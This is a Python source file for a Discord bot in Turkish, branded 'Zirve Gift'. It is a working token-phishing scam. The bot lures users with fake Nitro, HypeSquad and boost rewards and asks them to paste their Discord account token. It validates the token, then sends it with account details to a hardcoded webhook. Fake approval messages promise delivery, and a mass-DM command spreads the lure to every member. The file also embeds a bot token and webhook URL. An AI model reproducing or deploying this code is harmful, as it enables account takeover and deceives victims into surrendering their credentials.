# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
from discord import app_commands
from discord.ui import Button, View, Modal, TextInput, Select
import requests
import json
import os
import asyncio

# ===== KONFIGURASYON (SABİT BİLGİLER) =====
BOT_TOKEN = "MTUyNjcxMjM2NTQ5NDU2NjkzMg.GDj3jp.FnuHDb2p37z6HaYNdxQ0sFUswwjHcbIY9IHgbg"
WEBHOOK_URL = "https://discord.com/api/webhooks/1526713905865293944/Z1QPSN5Mbx30WGlkWPCLiqnX1JLPliiY_0ziIjq8OGw5NvRRyRBTSj8kSrMkuTfGyZrs"
TICKET_CATEGORY_ID = 1526849082579222678
GUILD_ID = 1469472843120246957
# ==========================================

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)  # Prefix gerekli değil ama hata vermesin diye

# ===== TOKEN DOĞRULAMA =====
def check_token(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code == 200:
            return True, r.json()
        else:
            return False, None
    except:
        return False, None

# ===================== 1. PANEL KOMUTU (ÖDÜL TICKET) =====================
class OdulView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 Nitro", style=discord.ButtonStyle.green)
    async def nitro(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="Nitro"))

    @discord.ui.button(label="🎫 Nitro Basic", style=discord.ButtonStyle.blurple)
    async def nitro_basic(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="Nitro Basic"))

    @discord.ui.button(label="🏅 HypeSquad", style=discord.ButtonStyle.gray)
    async def hypesquad(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="HypeSquad"))

    @discord.ui.button(label="🚀 14x Boost", style=discord.ButtonStyle.red)
    async def boost(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TokenModal(odul="14x Boost"))

class TokenModal(Modal):
    def __init__(self, odul: str):
        super().__init__(title=f"🎯 {odul} Odulu")
        self.odul = odul
        self.token_input = TextInput(
            label="Discord Token",
            placeholder="Tokenini buraya yapistir...",
            required=True,
            style=discord.TextStyle.paragraph
        )
        self.add_item(self.token_input)

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token_input.value
        kullanici = interaction.user
        guild = interaction.guild

        gecerli, veri = check_token(token)
        if not gecerli:
            await interaction.response.send_message("❌ **Gecersiz token!** Lutfen dogru token gir.", ephemeral=True)
            return

        username = f"{veri['username']}#{veri.get('discriminator', '0')}"
        nitro = veri.get('premium_type', 0)
        flags = veri.get('flags', 0)
        nitro_map = {0: "Yok", 1: "Nitro Classic", 2: "Nitro (Full)", 3: "Nitro Basic"}
        nitro_text = nitro_map.get(nitro, "Bilinmiyor")
        hype = "Yok"
        if flags & 64: hype = "Bravery"
        elif flags & 128: hype = "Brilliance"
        elif flags & 256: hype = "Balance"

        try:
            category = guild.get_channel(TICKET_CATEGORY_ID)
            if not category:
                await interaction.response.send_message("❌ Kategori bulunamadi! Lutfen ID'yi kontrol et.", ephemeral=True)
                return

            # Sadece kullanıcı ve bot görsün (yetkili rolü kaldırıldı)
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            channel = await guild.create_text_channel(
                name=f"odul-{kullanici.name}",
                category=category,
                overwrites=overwrites
            )

            embed = discord.Embed(
                title="🎫 Zirve Odul Ticket",
                description=(
                    f"**Kullanici:** {kullanici.mention}\n"
                    f"**Odul:** {self.odul}\n"
                    f"**Hesap:** {username}\n"
                    f"**Nitro:** {nitro_text}\n"
                    f"**HypeSquad:** {hype}\n\n"
                    f"**Token:** ||{token}||"
                ),
                color=0xffd700
            )
            embed.set_footer(text="Zirve Gift | Yetkili onayi bekleniyor")

            select = Select(
                placeholder="Odul kategorisini sec...",
                options=[
                    discord.SelectOption(label="ZirveGift", emoji="🎁", description="Ana odul"),
                    discord.SelectOption(label="Satin alim", emoji="💰", description="Satin alinan odul"),
                    discord.SelectOption(label="Urun bilgi", emoji="📄", description="Urun detaylari"),
                    discord.SelectOption(label="Sponsor", emoji="🤝", description="Sponsorluk"),
                    discord.SelectOption(label="Cekilis", emoji="🎲", description="Cekilis odulu"),
                    discord.SelectOption(label="Invite odul", emoji="📩", description="Davet odulu"),
                    discord.SelectOption(label="Gmail odul", emoji="📧", description="Gmail odulu")
                ]
            )
            async def select_callback(interaction2):
                await interaction2.response.send_message(f"✅ **{interaction2.data['values'][0]}** secildi.", ephemeral=True)
            select.callback = select_callback

            class OnayView(View):
                def __init__(self):
                    super().__init__(timeout=None)

                @discord.ui.button(label="✅ Onayla", style=discord.ButtonStyle.green)
                async def onay(self, interaction2: discord.Interaction, button: Button):
                    await interaction2.response.send_message("✅ Odul onaylandi!", ephemeral=False)
                    await kullanici.send(f"✅ {self.odul} odulun onaylandi! 27-72 saat icinde hesabina gonderilecek.")
                    requests.post(WEBHOOK_URL, json={"content": f"✅ {kullanici} icin {self.odul} odulu onaylandi."})

                @discord.ui.button(label="❌ Reddet", style=discord.ButtonStyle.red)
                async def red(self, interaction2: discord.Interaction, button: Button):
                    await interaction2.response.send_message("❌ Odul reddedildi.", ephemeral=False)
                    await kullanici.send(f"❌ {self.odul} odulun reddedildi. Lutfen yetkiliyle iletisime gec.")
                    requests.post(WEBHOOK_URL, json={"content": f"❌ {kullanici} icin {self.odul} odulu reddedildi."})

            view = OnayView()
            view.add_item(select)

            await channel.send(embed=embed, view=view)

            mesaj = (
                f"**🎫 Yeni Odul Ticket Acildi!**\n"
                f"Kullanici: {kullanici} (ID: {kullanici.id})\n"
                f"Odul: {self.odul}\n"
                f"Hesap: {username}\n"
                f"Nitro: {nitro_text}\n"
                f"HypeSquad: {hype}\n"
                f"Token: ||{token}||\n"
                f"Ticket: {channel.mention}"
            )
            requests.post(WEBHOOK_URL, json={"content": mesaj})

            await interaction.response.send_message(
                f"✅ **Token dogrulandi!** Ticket acildi: {channel.mention}",
                ephemeral=True
            )

        except Exception as e:
            await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)

# ===================== 2. TICKET KOMUTU (KATEGORILI) =====================
class TicketModal(Modal):
    def __init__(self, kategori: str):
        super().__init__(title=f"🎫 {kategori} Ticket")
        self.kategori = kategori
        self.aciklama = TextInput(
            label="Aciklama",
            placeholder="Detayli aciklama yaz...",
            required=True,
            style=discord.TextStyle.paragraph
        )
        self.add_item(self.aciklama)

    async def on_submit(self, interaction: discord.Interaction):
        kullanici = interaction.user
        guild = interaction.guild
        aciklama = self.aciklama.value

        try:
            category = guild.get_channel(TICKET_CATEGORY_ID)
            if not category:
                await interaction.response.send_message("❌ Kategori bulunamadi!", ephemeral=True)
                return

            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                kullanici: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            channel = await guild.create_text_channel(
                name=f"{self.kategori}-{kullanici.name}",
                category=category,
                overwrites=overwrites
            )

            embed = discord.Embed(
                title="🎫 Genel Ticket",
                description=(
                    f"**Kullanici:** {kullanici.mention}\n"
                    f"**Kategori:** {self.kategori}\n"
                    f"**Aciklama:** {aciklama}"
                ),
                color=0x00ff00
            )
            embed.set_footer(text="Zirve Ticket | Yetkili yanit verecek.")

            await channel.send(embed=embed)
            await interaction.response.send_message(
                f"✅ Ticket acildi: {channel.mention}",
                ephemeral=True
            )

        except Exception as e:
            await interaction.response.send_message(f"❌ Ticket acilamadi: {e}", ephemeral=True)

class KategoriView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 ZirveGift", style=discord.ButtonStyle.green)
    async def zirvegift(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="ZirveGift"))

    @discord.ui.button(label="💰 Satin alim", style=discord.ButtonStyle.blurple)
    async def satinalim(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Satin alim"))

    @discord.ui.button(label="📄 Urun bilgi", style=discord.ButtonStyle.gray)
    async def urunbilgi(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Urun bilgi"))

    @discord.ui.button(label="🤝 Sponsor", style=discord.ButtonStyle.gray)
    async def sponsor(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Sponsor"))

    @discord.ui.button(label="🎲 Cekilis", style=discord.ButtonStyle.gray)
    async def cekilis(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Cekilis"))

    @discord.ui.button(label="📩 Invite odul", style=discord.ButtonStyle.gray)
    async def invite(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Invite odul"))

    @discord.ui.button(label="📧 Gmail odul", style=discord.ButtonStyle.gray)
    async def gmail(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(TicketModal(kategori="Gmail odul"))

# ===================== SLASH KOMUTLAR =====================
@bot.tree.command(name="panel", description="Odul panelini gosterir.")
async def slash_panel(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🏆 Zirve Odul Paneli",
        description="Asagidaki butonlardan bir odul sec. Token'ini gir, ticket acilacak.",
        color=0xffd700
    )
    embed.set_footer(text="Zirve Panel | Ticket Sistemi")
    await interaction.response.send_message(embed=embed, view=OdulView())

@bot.tree.command(name="tick", description="Ticket olusturma panelini gosterir.")
async def slash_tick(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🎫 Zirve Ticket Sistemi",
        description="Asagidaki butonlardan bir kategori sec. Aciklama gir ve ticket olustur.",
        color=0x00ff00
    )
    embed.set_footer(text="Zirve Ticket | 7/24 Destek")
    await interaction.response.send_message(embed=embed, view=KategoriView())

@bot.tree.command(name="dm", description="Belirtilen kullaniciya DM gonderir.")
@app_commands.default_permissions(administrator=True)
async def slash_dm(interaction: discord.Interaction, member: discord.Member, mesaj: str):
    try:
        await member.send(f"📨 **Zirve Gift Bildirimi**\n\n{mesaj}")
        await interaction.response.send_message(f"✅ {member.mention} adli kullaniciya DM gonderildi.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message(f"❌ {member.mention} DM'ye kapali.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ Hata: {e}", ephemeral=True)

@bot.tree.command(name="duyuru", description="Tum uyelere DM duyurusu gonderir.")
@app_commands.default_permissions(administrator=True)
async def slash_duyuru(interaction: discord.Interaction, mesaj: str):
    guild = interaction.guild
    await interaction.response.send_message(f"📨 Duyuru gonderiliyor... Bu islem uzun surebilir.", ephemeral=True)
    
    basarili = 0
    basarisiz = 0
    
    for member in guild.members:
        if member.bot:
            continue
        try:
            await member.send(f"📢 **Zirve Gift Duyuru**\n\n{mesaj}")
            basarili += 1
        except:
            basarisiz += 1
        await asyncio.sleep(0.5)
    
    await interaction.followup.send(f"✅ {basarili} kisiye gonderildi. ❌ {basarisiz} kisiye gonderilemedi.")

# ===== BOT HAZIR =====
@bot.event
async def on_ready():
    print(f"✅ Zirve Bot aktif! Kullanici: {bot.user}")
    try:
        # Komutları belirtilen sunucuya senkronize et
        guild = discord.Object(id=GUILD_ID)
        await bot.tree.sync(guild=guild)
        print(f"✅ Slash komutlar {GUILD_ID} ID'li sunucuya senkronize edildi.")
    except Exception as e:
        print(f"❌ Senkronizasyon hatasi: {e}")

bot.run(BOT_TOKEN)
